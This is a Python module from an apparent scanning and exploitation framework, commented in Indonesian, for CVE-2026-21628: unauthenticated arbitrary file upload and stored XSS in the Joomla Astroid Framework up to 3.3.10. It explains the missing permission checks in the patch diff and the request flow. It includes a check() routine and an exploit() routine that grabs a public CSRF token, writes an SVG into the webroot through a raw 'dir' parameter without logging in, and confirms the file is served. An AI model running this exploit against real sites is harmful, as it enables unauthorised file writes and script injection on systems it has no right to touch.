#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-21628 — Astroid Framework <= 3.3.10 — Unauthenticated arbitrary file
upload / write (CWE-434) + stored XSS (CWE-79) via the Astroid media AJAX API.

ROOT CAUSE (dibuktikan lewat diff rilis resmi 3.3.10 -> 3.3.11, bukan dugaan):

  framework/library/astroid/Helper/Media.php

  3.3.11 (DIPATCH) menambahkan ke EMPAT fungsi:

      $user = Factory::getApplication()->getIdentity();
      if (!$user->authorise('core.manage', 'com_media')) {
          throw new \\JAccessExceptionNotallowed(Text::_('JERROR_ALERTNOAUTHOR'), 403);
      }

  pada upload(), createFolder(), remove(), rename().

  3.3.10 (RENTAN): tidak satu pun dari keempat fungsi memeriksa izin `core.manage`.
  Yang tersisa hanyalah `checkAuth()` di pemanggil (Admin::media()) — dan itu hanya
  `Session::checkToken()`, yaitu token CSRF yang tersedia pada halaman PUBLIK.
  Jadi tanpa login, penyerang hanya perlu mengambil token CSRF dari front-end.

  Dua kelemahan tambahan di dalam upload() 3.3.10:

    $dir   = $input->get('dir', '', 'RAW');       // RAW — tanpa sanitasi path
    $uploadDir = JPATH_SITE . '/' . $dir;         // tulis ke direktori mana pun
    ...
    if ($media == 'images' && $uploadedFileExtension != 'svg') {
        getimagesize($fileTemp);                  // DILEWATI bila ekstensi 'svg'
    }
    $fileName = preg_replace("/[^A-Za-z0-9]/i", "-", $pathinfo['filename'])
              . '.' . $pathinfo['extension'];     // ekstensi disimpan apa adanya
    File::upload($fileTemp, $uploadPath);

SINK UNAUTH (rantai lengkap, tanpa login):

  plugins/astroid/src/Extension/AstroidPlugin.php:38   onAfterRoute()
      if ($option == 'com_ajax' && !empty($astroid)) { Framework::getClient()->execute($astroid); }
          -> Helper/Client.php:138  execute('media') -> Admin::media()
          -> framework/library/astroid/Admin.php:73  media()
              $this->checkAuth();                        // hanya Session::checkToken()
              $action = $input->get('action','','RAW');  // 'upload'
              Helper\\Media::$func();                    // -> Media::upload()

BENTUK REQUEST (terverifikasi di lab):

  GET  /administrator/index.php?option=com_ajax&astroid=media
       -> ambil token CSRF (name="<32hex>" value="1") dari body

  POST /administrator/index.php
       ?option=com_ajax&astroid=media&action=upload&dir=<DIR>&media=images
       body : multipart, field <token>=1, file=@shell.svg (type image/svg+xml)

  Respon sukses: {"status":"success","code":200,"data":{"filepath":".../x.svg",...}}

DAMPAK:
  - Penulisan file sewenang-wenang ke direktori web-accessible (dir RAW mentah).
  - Stored XSS: SVG dengan <script> diterima utuh dan disajikan dengan
    Content-Type: image/svg+xml (eksekusi JS saat dibuka langsung di browser).
  - Kombinasi dir + ekstensi memungkinkan penempatan artefak penyerang di
    dalam webroot tanpa otentikasi.

BUKTI LAB (Joomla 5.4.8 + Astroid 3.3.10, port 8106):
    * Upload unauth -> {"status":"success","filepath":"/var/www/html/images/a.svg"}
    * File nyata di disk (www-data:www-data) dan disajikan GET /images/a.svg 200
      dengan content-type image/svg+xml -> XSS tersimpan.
    * media=images memakai allowlist gambar (jpeg,...,svg); ekstensi 'svg'
      melewati pemeriksaan getimagesize().
    * dir=media -> tulis ke /var/www/html/media/trav.svg (RAW, tanpa sanitasi).
    * Differential: Astroid 3.3.11 memberi 403 (JAccessExceptionNotallowed).
"""

import re

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_VULN,
                detect_platform, register, ver_le)

CVES = ["CVE-2026-21628"]
CLUSTER = "joomla_ext"
PRODUCT = "Astroid Framework (com_ajax astroid=media)"
VERSIONS_AFFECTED = ["3.3.10 dan seluruh rilis lebih lama (<= 3.3.10)"]
VULN_MAX = (3, 3, 10)

AJAX_PATHS = [
    "administrator/index.php?option=com_ajax&astroid=media",
    "index.php?option=com_ajax&astroid=media",
]
DETECT_PATHS = [
    "administrator/manifests/libraries/astroid.xml",
    "plugins/system/astroid/astroid.xml",
    "administrator/manifests/packages/astroid.xml",
]
VER_PATHS = [
    "administrator/manifests/libraries/astroid.xml",
    "plugins/system/astroid/astroid.xml",
    "libraries/astroid/plugins/astroid/astroid.xml",
]
TOKEN_RX = (
    r'name="([a-f0-9]{32})"\s+value="1"',
    r'value="1"\s+name="([a-f0-9]{32})"',
    r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
)
MEDIA_ACTIONS = ["upload", "createFolder", "rename", "remove"]


def _get(h, url, **kw):
    try:
        return h.get(url, **kw)
    except Exception:
        return None


def _norm(t):
    return t.url.rstrip("/")


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", s).split(".") if x != "")
    except Exception:
        return ()


def _detect(h, t):
    """Return (found, version_str, raw_xml)."""
    base = _norm(t)
    ver_raw = None
    for p in VER_PATHS:
        r = _get(h, f"{base}/{p}")
        if not r or r.status_code != 200 or "<extension" not in r.text:
            continue
        m = re.search(r"<version>\s*([\d.]+)\s*</version>", r.text)
        if m:
            ver_raw = m.group(1).strip()
            break
    for p in DETECT_PATHS:
        r = _get(h, f"{base}/{p}")
        if r and r.status_code == 200 and len(r.text) > 20:
            return True, ver_raw, (r.text[:400] if ver_raw is None else "")
    return (ver_raw is not None), ver_raw, ""


def _token(h, t):
    """CSRF token CSRF dari HALAMAN YANG SAMA dengan endpoint POST.

    Penting: token Joomla terikat ke cookie sesi. Bila token diambil dari
    halaman lain (yang memicu redirect/rotasi sesi), POST akan ditolak
    'invalid security token'. Ambil dari endpoint AJAX itu sendiri.
    """
    base = _norm(t)
    # Satu request saja: halaman AJAX yang sama dengan endpoint POST.
    # Jangan lanjut ke halaman lain — respons non-200/redirect merotasi
    # cookie sesi dan membuat token yang sudah didapat jadi tidak valid.
    r = _get(h, f"{base}/administrator/index.php?option=com_ajax&astroid=media")
    if r and r.status_code == 200:
        for rx in TOKEN_RX:
            m = re.search(rx, r.text, re.I)
            if m:
                return m.group(1)
    r = _get(h, f"{base}/index.php")
    if r and r.status_code == 200:
        for rx in TOKEN_RX:
            m = re.search(rx, r.text, re.I)
            if m:
                return m.group(1)
    return None


def _probe(h, t, token, dir_, ext, action="upload", with_file=True):
    """Kirim satu request upload; return (status_code, body, ok, filepath).

    with_file=False -> ORACLE NON-DESTRUKTIF: tidak ada berkas dikirim sama
    sekali (files=None). Gate otorisasi Astroid tetap terlihat, tetapi tidak
    ada byte pun yang ditulis ke server. with_file=True hanya dipakai exploit().
    """
    base = _norm(t)
    url = (f"{base}/administrator/index.php?option=com_ajax&astroid=media"
           f"&action={action}&dir={dir_}&media=images")
    files = None
    if with_file:
        body = b'<svg xmlns="http://www.w3.org/2000/svg"><!--megapack--></svg>'
        files = {"file": (f"mp-probe.{ext}", body, "image/svg+xml")}
    data = {token: "1"} if token else {}
    try:
        r = h.post(url, data=data, files=files)
    except Exception:
        return None, "", False, None
    ok = '"status":"success"' in r.text
    m = re.search(r'"filepath":"([^"]+)"', r.text)
    return r.status_code, r.text[:400], ok, (m.group(1) if m else None)


def _verify_file(h, url):
    """GET file yang baru ditulis; return (status, content_type, marker_found)."""
    r = _get(h, url)
    if not r:
        return None, "", False
    ct = r.headers.get("Content-Type", "")
    return r.status_code, ct, "megapack" in r.text.lower()


def _fresh_http(h):
    """Sesi HTTP baru dengan pengaturan sama seperti `h`.

    Diperlukan karena request 403/404 selain endpoint (mis. saat deteksi versi)
    memicu rotasi UA/cookie di Joomla dan membuat token CSRF stale. Fase upload
    harus berjalan pada sesi yang bersih.
    """
    try:
        return type(h)(timeout=getattr(h, "timeout", 20.0),
                       proxy=getattr(h, "s", None) and None or None,
                       verify_tls=getattr(h, "verify", False),
                       verbose=getattr(h, "verbose", False),
                       retries=0, delay=0)
    except Exception:
        return h


def _attempt(h, t, dir_, ext, action="upload", with_file=True):
    """Satu percobaan lengkap: ambil token lalu POST memakai sesi yang sama.

    Sesi Joomla bisa merotasi cookie di antara request, jadi token HARUS
    diambil dan segera dipakai. Bila token ditolak, ulangi sekali lagi.
    with_file=False dipakai check() (oracle tanpa berkas); True dipakai exploit().
    """
    for _ in range(3):
        tok = _token(h, t)
        if not tok:
            continue
        sc, body, ok, fp = _probe(h, t, tok, dir_, ext, action, with_file=with_file)
        if ok:
            return sc, body, ok, fp
        if "invalid security token" not in body:
            return sc, body, ok, fp
    return sc, body, ok, fp


def check(t, h, opts=None):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw, _ = _detect(h, t)
    if not found:
        return ST_CLEAN, "Astroid tidak terdeteksi", ""

    ver = _ver_tuple(raw)
    tok = _token(h, t)
    detail = f"astroid={raw or '?'} token={'yes' if tok else 'no'}"

    if not tok:
        if ver and ver_le(ver, VULN_MAX):
            return ST_INFO, f"Astroid {raw} masuk rentang rentan, token CSRF tak didapat", detail
        return ST_INFO, "Astroid terdeteksi, versi tak dapat dipastikan", detail

    # ORACLE NON-DESTRUKTIF: kirim request TANPA berkas (files=None).
    # Astroid memeriksa otorisasi/parameter sebelum isi berkas, jadi gate tetap
    # terlihat ("ALERTNOAUTHOR"/403) sementara tidak ada byte pun ditulis.
    # Percobaan upload nyata HANYA di exploit().
    hx = _fresh_http(h)
    sc, body, ok, fp = _attempt(hx, t, "images", "svg", with_file=False)
    if ok:
        # Tidak mungkin tanpa berkas; tetap dijaga sebagai jaring keamanan.
        return (ST_INFO,
                "Astroid media API menerima request upload unauth tanpa berkas",
                detail + f" | {sc} {fp}")
    if sc == 403 or "ALERTNOAUTHOR" in body or "not allowed" in body.lower():
        return ST_CLEAN, "Astroid menolak (403 — patch otorisasi aktif)", detail
    if sc == 200 and "INVALID EXTENSION" in body:
        return ST_CLEAN, "Astroid menolak ekstensi (allowlist aktif)", detail
    if sc == 200 and ("invalid file" in body.lower() or "no file" in body.lower()):
        return (ST_INFO,
                "Astroid media API menembus gate ACL tanpa otorisasi "
                "(controller memproses request; tidak ada berkas dikirim)",
                detail + f" | {body[:120]}")
    if ver and ver_le(ver, VULN_MAX):
        return ST_INFO, f"Astroid {raw} rentan secara versi, sink belum memicu", detail
    return ST_CLEAN, "tidak ada indikasi", detail


def exploit(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw, _ = _detect(h, t)
    if not found:
        return ST_SKIP, "Astroid tidak terdeteksi", ""

    ver = _ver_tuple(raw)
    base = _norm(t)
    hx = _fresh_http(h)

    # Vektor 1: stored XSS via SVG (ekstensi di allowlist images, getimagesize dilewati).
    sc, body, ok, fp = _attempt(hx, t, "images", "svg")
    if ok and fp:
        real = fp.replace("\\/", "/")
        rel = real.replace("/var/www/html", "")
        url = f"{base}{rel}"
        # Verifikasi objektif: file benar-benar dapat diambil & isinya utuh.
        vsc, vct, marker = _verify_file(hx, url)
        ev = (f"astroid={raw or '?'} file={real} url={url} "
              f"verify=[{vsc} {vct}{' marker' if marker else ''}]")
        if vsc == 200:
            return (ST_PWN,
                    "Astroid unauth arbitrary file write (SVG tersimpan di webroot)",
                    ev)
        return (ST_VULN,
                "Astroid menerima upload (filepath dikembalikan) tetapi file belum terverifikasi",
                ev)

    # Vektor 2: tulis ke direktori lain lewat `dir` mentah (RAW).
    for d in ("media", "images"):
        sc2, body2, ok2, fp2 = _attempt(hx, t, d, "svg")
        if ok2 and fp2:
            r2 = fp2.replace("\\/", "/")
            return (ST_PWN,
                    "Astroid unauth arbitrary file write — direktori dikendalikan `dir`",
                    f"astroid={raw or '?'} dir={d} file={r2} "
                    f"url={base}{r2.replace('/var/www/html', '')}")

    if sc == 403 or "ALERTNOAUTHOR" in body:
        return ST_CLEAN, "Astroid dipatch (403)", f"astroid={raw or '?'}"
    if ver and ver_le(ver, VULN_MAX):
        return ST_VULN, "Astroid rentan secara versi, upload tidak berhasil", f"astroid={raw or '?'} body={body[:120]}"
    return ST_CLEAN, "tidak ada indikasi", f"astroid={raw or '?'}"


register(CveModule(
    cve="CVE-2026-21628",
    cluster=CLUSTER,
    title="Astroid Framework - Unauthenticated arbitrary file upload / write via media AJAX API",
    vclass="arbitrary file upload / write (unauth) + stored XSS",
    cwe="CWE-434",
    product=PRODUCT,
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["komponen/library Astroid terpasang dan plugin system 'astroid' aktif",
              "endpoint administrator/index.php?option=com_ajax&astroid=media reachable",
              "token CSRF dapat diambil dari halaman publik (tanpa login)"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff resmi 3.3.10->3.3.11: Helper/Media.php upload()/createFolder()/"
           "remove()/rename() tidak memeriksa core.manage; patch menambahkan "
           "JAccessExceptionNotallowed(403). Sisa proteksi hanya Session::checkToken() "
           "di Admin::media() -> token CSRF publik cukup (unauth). Bug sekunder: `dir` "
           "diambil RAW (path traversal) dan ekstensi 'svg' melewati getimagesize(), "
           "sehingga SVG ber-<script> tersimpan & disajikan sebagai image/svg+xml "
           "(stored XSS). Lab-verified 5.4.8+3.3.10: upload sukses -> file di "
           "/var/www/html/images/, GET 200 image/svg+xml; dir=media -> tulis ke /media/; "
           "3.3.11 -> 403."),
))
